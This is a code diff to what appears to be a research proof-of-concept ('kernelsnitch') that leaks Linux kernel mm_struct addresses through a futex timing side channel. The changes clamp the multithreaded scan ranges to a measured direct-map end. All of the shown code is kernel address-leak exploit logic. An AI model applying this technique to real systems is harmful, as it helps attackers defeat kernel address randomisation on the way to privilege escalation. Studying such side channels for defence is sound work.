@@ -230,8 +230,14 @@ static void *__mm_leak(void *arg)
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+        size_t slab_end = coarse_addr + COARSE_SZ;
+        if (slab_end > range->end)
+            slab_end = range->end;
+        for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
+            size_t slab_limit = slab_addr + mm_slab_sz;
+            if (slab_limit > slab_end)
+                slab_limit = slab_end;
+            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (mm_leak_arg->try_canonical) {
                     size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
@@ -261,6 +267,9 @@ static void *__mm_leak(void *arg)
 
 static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
 {
+    /* the leak check discards a match past the measured end, so no slice
+     * scans past it */
+    size_t ceiling = MIN(g_direct_map_end, IDENTITY_END);
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
@@ -273,6 +282,8 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
             mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
         if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
             mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+        if (mm_leak_arg->range.end > ceiling)
+            mm_leak_arg->range.end = ceiling;
         SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
@@ -312,7 +323,9 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
-    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
+    /* mm_structs live in the direct map, so the scan stops at its end and never
+     * past the identity range the futexes are drawn from */
+    ks->identity_diff = ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START)/ks->thread_cnt);
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
